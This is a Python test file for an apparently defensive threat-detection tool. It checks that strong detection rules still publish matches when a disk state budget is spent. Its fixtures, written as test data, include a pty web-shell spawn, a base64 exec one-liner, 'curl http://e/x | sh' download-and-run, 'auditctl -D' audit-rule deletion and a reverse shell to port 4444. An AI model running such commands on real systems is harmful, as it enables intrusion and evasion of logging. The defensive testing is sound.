"""A spent state budget never starves strong evidence. Routine volume is charged to its own slice of the hunt's disk
budget and can never spend the strong rules' slice; when a rule's slice is spent it keeps reading every record:
matches that need no new state still publish, a strong per-record item that has no room for its group publishes on
its own, and only records needing new grouping state are refused (coverage partial, the reason named). At finalize,
a rule that cannot get disk publishes its per-record items from what is readable."""
from datetime import UTC, datetime, timedelta

from romulus.detect import network, tamper
from romulus.detect.bounded import StateBudget
from romulus.detect.host import WebServiceSpawnsInterpreter
from romulus.detect.indicators import Indicator, IndicatorMatch, IndicatorSet
from romulus.detect.lineage import ReverseShellByLineage
from romulus.evidence.typed import Outcome, RawRef, TypedEvent, fv
from romulus.hunt import sweep as sw
from romulus.sources.models import Completeness, SearchOutcome, Window
from romulus.store.db import make_engine, migrate
from romulus.store.repo import Repo

T0 = datetime(2030, 4, 2, 8, 0, tzinfo=UTC)
EXT = "203.0.113.9"
_n = 0


def ev(family, ts, host="app01", **fields) -> TypedEvent:
    global _n
    _n += 1
    return TypedEvent(id=f"sv{_n:07d}", family=family, ts=ts, host=host, outcome=Outcome.success,
                      fields={k.replace("__", "."): fv(v, f"sv{_n}:{k}") for k, v in fields.items() if v is not None},
                      raw=[RawRef(target="fx", native_id=f"sv{_n}")], normalizer="fixture")


def flow(i: int, ts) -> TypedEvent:
    """Routine volume: one flow per (source, destination) pair, each a new port-scan group."""
    return ev("net_flow", ts, host="sensor", source__ip=f"10.{i // 250 % 250}.{i % 250}.1", source__port=40000,
              destination__ip=f"172.16.{i // 250 % 250}.{i % 250}", destination__port=443)


def web_shell(ts, argv=("/usr/bin/python3", "-c", "import pty;pty.spawn('/bin/bash')")) -> TypedEvent:
    return ev("process_exec", ts, host="web01", process__argv=list(argv), process__user="www-data",
              process__executable=argv[0], process__pid=900)


def web_rare(ts, i) -> TypedEvent:
    """A web-service interpreter run without a typed indicator: judged by its shape's rarity (grouping state)."""
    return ev("process_exec", ts, host="web01", process__argv=["/bin/sh", "-c", f"/usr/bin/tool{i} -m 1"],
              process__user="www-data", process__executable="/bin/dash", process__pid=950 + i)


LISTED = IndicatorSet([
    Indicator(id="C2-DOM", kind="domain", values=("c2.test",), label="test C2 domain", severity="high", lane="high",
              source="unit"),
])


class _Listed(IndicatorMatch):
    def __init__(self):
        super().__init__(LISTED)


def query(ts, name) -> TypedEvent:
    return ev("dns_query", ts, host="sensor", source__ip="10.0.0.5", dns__question__name=name)


def delete_rules(ts, pid=7004) -> TypedEvent:
    return ev("process_exec", ts, host="node7", process__argv=["auditctl", "-D"],
              process__executable="/usr/sbin/auditctl", process__uid="0", process__user="root", process__pid=pid,
              process__ppid=7000, process__cwd="/root")


def reverse_shell(ts) -> list[TypedEvent]:
    """A www-data python connects out, then re-execs a shell in the same pid."""
    return [ev("process_exec", ts, process__executable="/usr/bin/python3", process__pid=500,
               process__argv=["/usr/bin/python3"], process__user="www-data"),
            ev("net_socket", ts + timedelta(seconds=1), socket__syscall="connect", process__pid=500,
               process__executable="/usr/bin/python3", process__user="www-data", destination__ip=EXT,
               destination__port=4444),
            ev("process_exec", ts + timedelta(seconds=2), process__executable="/bin/bash", process__pid=500,
               process__argv=["/bin/bash"], process__user="www-data")]


def run_sweep(monkeypatch, tmp_path, pack, batches, budget):
    """The sweep over these batches with this budget; (published matches, rule cells)."""
    engine = make_engine(":memory:")
    migrate(engine)
    repo = Repo(engine)
    repo.create_hunt("h1", {"targets": ["romulus-host-x"]}, "d", "t")
    now = datetime.now(UTC)
    monkeypatch.setattr(sw, "execute", lambda client, intent, contract: SearchOutcome(
        target=intent.target, fingerprint="f", started_at=now, ended_at=now, completeness=Completeness.complete,
        total=0, total_relation="eq", returned=0, records=[]))
    feed = iter(batches)
    monkeypatch.setattr(sw, "normalize_hits", lambda records, boots: (next(feed), {}, []))
    monkeypatch.setattr(sw, "state_budget", lambda settings, stage_dir: budget)
    published = []
    monkeypatch.setattr(sw, "publish_match", lambda repo_, hunt, pb, m, *a, **k: published.append(m) or None)
    sweep = sw.Sweep(repo, object(), "h1", Window(start=T0, end=T0 + timedelta(hours=6)), {"romulus-host-x": None},
                     stage_dir=tmp_path)
    sweep.pack = pack
    for pb in pack:
        pb.spill_dir, pb.budget = tmp_path, budget
    for k in range(len(batches)):
        start = T0 + timedelta(minutes=10 * k)
        sweep.run_partition("romulus-host-x", None, [], Window(start=start, end=start + timedelta(minutes=10)), est=1)
    sweep.finalize()
    return published, repo.rule_cells("h1")


def _by_rule(published, rule_id):
    return [m for m in published if m.playbook_id == rule_id]


def _strong_batch(ts):
    return [web_shell(ts), query(ts + timedelta(seconds=1), "beacon.c2.test"),
            delete_rules(ts + timedelta(seconds=2)), *reverse_shell(ts + timedelta(seconds=3))]


def _pack(monkeypatch, routine_hot=1, strong_hot=None):
    monkeypatch.setattr(network.PortScan, "HOT", routine_hot)
    monkeypatch.setattr(network.PortScan, "REQUESTS_HOT", routine_hot)
    if strong_hot is not None:
        monkeypatch.setattr(_Listed, "HOT", strong_hot)
    return [network.PortScan(), WebServiceSpawnsInterpreter(), _Listed(), tamper.AuditRulesTamper(),
            ReverseShellByLineage()]


def test_routine_volume_spends_only_its_own_slice_and_strong_records_still_publish(monkeypatch, tmp_path):
    budget = StateBudget(tmp_path, disk_total=400_000, reserve=0, strong_share=0.5)
    flood = [[flow(5000 * b + i, T0 + timedelta(minutes=b, seconds=i % 60)) for i in range(5000)] for b in range(4)]
    later = _strong_batch(T0 + timedelta(hours=2))
    published, cells = run_sweep(monkeypatch, tmp_path, _pack(monkeypatch), [*flood, later], budget)
    assert budget.slice_over["routine"] and not budget.slice_over["strong"]
    # the routine rule refuses records needing new groups, and says so
    scan = [c for c in cells if c["rule_id"] == network.PortScan.id and c["target"] != "*"]
    assert any(c["state"] == "evaluated_partial" and c["detail"].get("state_capped") for c in scan)
    # every strong record read after the routine slice was spent is still found, as it would be with room
    [shell] = [m for m in _by_rule(published, WebServiceSpawnsInterpreter.id) if m.events[0].host == "web01"]
    assert shell.proposed_lane == "lead" and "|unheld" not in shell.group_key
    [ioc] = _by_rule(published, _Listed.id)
    assert ioc.proposed_lane == "high" and "beacon.c2.test" in ioc.claim and "|unheld" not in ioc.group_key
    [rules] = _by_rule(published, tamper.AuditRulesTamper.id)
    assert "delete every audit rule (-D)" in rules.claim
    [reverse] = _by_rule(published, ReverseShellByLineage.id)
    assert reverse.proposed_lane == "high" and EXT in reverse.claim
    for rule_id in (_Listed.id, tamper.AuditRulesTamper.id, ReverseShellByLineage.id,
                    WebServiceSpawnsInterpreter.id):
        assert all(not c["detail"].get("state_capped") for c in cells if c["rule_id"] == rule_id)


def test_with_the_strong_slice_spent_direct_and_per_record_matches_still_publish(monkeypatch, tmp_path):
    budget = StateBudget(tmp_path, disk_total=2**40, reserve=0)
    budget.slice_over["strong"] = "detector state on disk of strong rules reached its share (test)"
    ts = T0 + timedelta(hours=1)
    shell = web_shell(ts + timedelta(seconds=9), ("/usr/bin/python3", "-c",
                                                  "import base64;exec(base64.b64decode('aWQ='))"))
    batch = [*_strong_batch(ts), shell, web_rare(ts + timedelta(seconds=10), 1),
             web_rare(ts + timedelta(seconds=11), 1), query(ts + timedelta(seconds=12), "again.c2.test")]
    published, cells = run_sweep(monkeypatch, tmp_path, _pack(monkeypatch), [batch], budget)
    web = [m for m in _by_rule(published, WebServiceSpawnsInterpreter.id) if m.events[0].host == "web01"]
    # a direct match needs no state: published as with room, at its own lane
    [direct] = [m for m in web if shell.id in {e.id for e in m.events}]
    assert direct.proposed_lane == "urgent" and "|unheld" not in direct.group_key
    # a run judged by its shape's rarity cannot be counted: one lead per shape, however many runs
    assert len([m for m in web if m.group_key.endswith("|unheld") and "tool1" in m.claim]) == 1
    # an indicator hit and a tamper command have no room for a group: each group publishes from its first record
    [ioc] = _by_rule(published, _Listed.id)
    assert ioc.group_key.endswith("|unheld") and ioc.proposed_lane == "high" and len(ioc.events) == 1
    [rules] = _by_rule(published, tamper.AuditRulesTamper.id)
    assert rules.group_key.endswith("|unheld") and "delete every audit rule (-D)" in rules.claim
    # a join that needs new state (the reverse shell's shell exec) is refused, and coverage says why
    assert _by_rule(published, ReverseShellByLineage.id) == []
    reverse = [c for c in cells if c["rule_id"] == ReverseShellByLineage.id and c["target"] != "*"]
    assert any(c["state"] == "evaluated_partial" and c["detail"].get("state_capped") for c in reverse)
    window = next(c for c in cells if c["rule_id"] == ReverseShellByLineage.id and c["target"] == "*")
    assert any("state budget is spent" in r for r in window["detail"]["reasons"])


def test_the_reviewer_probe_a_spent_hunt_budget_publishes_the_same_direct_matches(monkeypatch, tmp_path):
    def published_with(spent: bool, where):
        budget = StateBudget(where, disk_total=2**40, reserve=0)
        if spent:
            budget.over_total = "detector state on disk reached the hunt's budget (probe)"
        batch = [web_shell(T0), web_shell(T0 + timedelta(seconds=1), ("/bin/sh", "-c", "curl http://e/x | sh"))]
        published, _cells = run_sweep(monkeypatch, where, [WebServiceSpawnsInterpreter()], [batch], budget)
        return sorted((m.proposed_lane, m.severity, m.claim.split(" (argv")[0]) for m in published)
    (tmp_path / "a").mkdir()
    (tmp_path / "b").mkdir()
    assert published_with(True, tmp_path / "a") == published_with(False, tmp_path / "b") != []


def test_finalize_without_disk_still_publishes_tamper_commands_and_held_indicator_groups(monkeypatch, tmp_path):
    from tests.test_bounded_hostrules_tamper_ioc import fleet_config
    monkeypatch.setattr(tamper.AuditRulesTamper, "HOT", 2)
    rule = tamper.AuditRulesTamper()
    rule.spill_dir = tmp_path / "t"
    rule.budget = StateBudget(tmp_path, disk_total=2**40, reserve=0)
    stage = {}
    command = delete_rules(T0 + timedelta(hours=3))
    for part in ([fleet_config(T0 + timedelta(seconds=i), f"node{i}", i) for i in range(20)], [command]):
        rule.consume(part)
        stage.update({e.id: e for e in rule.drain_staged()})
    assert rule.configs.on_disk > 0
    rule.bind_loader(lambda ids: [stage[i] for i in ids if i in stage])
    rule.budget.finalizing = True
    rule.budget.low_space = "the stage volume's free space is below the reserve (test)"
    out = sw.Sweep._finalize_rule(rule)                 # finalize needs disk to order the records: it falls back
    [m] = [m for m in out if command.id in {e.id for e in m.events}]
    assert "delete every audit rule (-D)" in m.claim and any("linking them needed disk" in n for n in m.notes)
    assert any("finalize stopped" in r for r in rule.limit_reasons())
    rule.close_spill()

    monkeypatch.setattr(_Listed, "HOT", 1)
    ioc = _Listed()
    ioc.spill_dir = tmp_path / "i"
    ioc.budget = StateBudget(tmp_path, disk_total=2**40, reserve=0)
    stage = {}
    for k in range(3):
        ioc.consume([query(T0 + timedelta(minutes=k), f"x{k}.c2.test")])
        stage.update({e.id: e for e in ioc.drain_staged()})
    ioc.bind_loader(lambda ids: [stage[i] for i in ids if i in stage])
    ioc.groups.broken = ioc.budget.broken = "writing detector state failed (test)"
    out = sw.Sweep._finalize_rule(ioc)                  # the table on disk cannot be read: memory only
    assert [m.group_key.split("|")[3] for m in out] == ["x2.c2.test"]
    assert any("published from memory only" in n for n in out[0].notes)
    ioc.close_spill()
